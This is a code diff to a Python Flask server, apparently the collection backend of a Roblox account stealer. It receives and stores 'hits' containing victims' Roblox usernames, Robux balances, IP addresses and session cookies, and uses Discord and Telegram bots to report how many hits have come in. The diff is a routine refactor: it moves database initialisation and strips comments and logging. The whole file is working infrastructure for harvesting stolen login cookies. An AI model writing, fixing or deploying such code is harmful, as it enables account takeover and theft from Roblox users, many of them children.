@@ -16,23 +16,16 @@ ENABLE_TELEGRAM = bool(TELEGRAM_TOKEN and TELEGRAM_CHAT_ID)
 DISCORD_WEBHOOK_URL = os.environ.get("DISCORD_WEBHOOK_URL", "")
 API_TOKEN = os.environ.get("API_TOKEN", "123")
 
-# ---------- API URL – try localhost first, fallback to public ----------
 PORT = os.environ.get("PORT", "5000")
-PUBLIC_URL = os.environ.get("RENDER_EXTERNAL_URL", "").replace("https://", "http://")  # fallback
-
-# We'll use localhost for internal calls, but if that fails, the bot can use the public URL.
-# However, for simplicity, we'll stick to localhost because they're in the same container.
 API_BASE_URL = f"http://127.0.0.1:{PORT}"
 print(f"[Init] API internal URL: {API_BASE_URL}")
 
 DB_FILE = "hits.db"
 
-# ---------- Database (with robust schema) ----------
+# ---------- Database ----------
 def init_db():
     conn = sqlite3.connect(DB_FILE)
     c = conn.cursor()
-    # Drop old table if exists to avoid schema issues (optional – comment out after first deploy)
-    # c.execute('DROP TABLE IF EXISTS hits')
     c.execute('''CREATE TABLE IF NOT EXISTS hits (
                     id INTEGER PRIMARY KEY AUTOINCREMENT,
                     timestamp TEXT,
@@ -48,16 +41,14 @@ def init_db():
     conn.close()
     print("[DB] Table ready.")
 
+# **FIX: Call init_db() immediately so the table exists before any request**
+init_db()
+
 def add_hit(data):
-    """
-    Extract from any format, convert types, handle missing fields.
-    """
-    # Extract from nested (new) or flat (old)
     roblox = data.get('roblox', {})
     system = data.get('system', {})
 
     username = roblox.get('username') or data.get('username', 'N/A')
-    # Ensure robux is int
     robux_val = roblox.get('robux') or data.get('robux', 0)
     try:
         robux = int(robux_val)
@@ -71,8 +62,6 @@ def add_hit(data):
     cookie = roblox.get('cookie') or data.get('cookie', 'N/A')
     timestamp = data.get('timestamp') or datetime.now().isoformat()
 
-    print(f"[DB] Insert: user={username}, robux={robux}, ip={ip}")
-
     try:
         conn = sqlite3.connect(DB_FILE)
         c = conn.cursor()
@@ -84,12 +73,6 @@ def add_hit(data):
         return True
     except Exception as e:
         print(f"[DB] Insert ERROR: {e}")
-        # Try to log the raw data to a file for debugging
-        try:
-            with open("debug_insert_error.log", "a") as f:
-                f.write(f"{datetime.now().isoformat()} - {e}\n{json.dumps(data)[:500]}\n\n")
-        except:
-            pass
         return False
 
 def get_all_hits():
@@ -186,7 +169,6 @@ def get_hits():
     try:
         return jsonify(get_all_hits())
     except Exception as e:
-        print(f"[GET_HITS] Error: {e}")
         return jsonify({"error": str(e)}), 500
 
 @app.route('/total', methods=['GET'])
@@ -229,8 +211,7 @@ def run_discord_bot():
     @bot.command(name='howmanyhits')
     async def how_many_hits(ctx):
         try:
-            url = f"{API_BASE_URL}/get_hits"
-            resp = requests.get(url, headers={"X-Auth-Token": API_TOKEN}, timeout=10)
+            resp = requests.get(f"{API_BASE_URL}/get_hits", headers={"X-Auth-Token": API_TOKEN}, timeout=10)
             if resp.status_code != 200:
                 await ctx.send(f"Error (status {resp.status_code}): {resp.text}")
                 return
@@ -362,12 +343,12 @@ def run_telegram_bot():
 # ---------- Main ----------
 if __name__ == "__main__":
     if len(sys.argv) > 1 and sys.argv[1] == "--server":
-        init_db()
+        # For local testing – already initialized above, but we'll keep for safety
         threading.Thread(target=app.run, kwargs={'host':'0.0.0.0','port':int(PORT),'debug':False}, daemon=True).start()
         time.sleep(2)
         start_bots()
         while True:
             time.sleep(1)
     else:
+        # For gunicorn – nothing else needed (init_db already called)
         print(f"Starting server (gunicorn) on port {PORT} ...")
-        init_db()
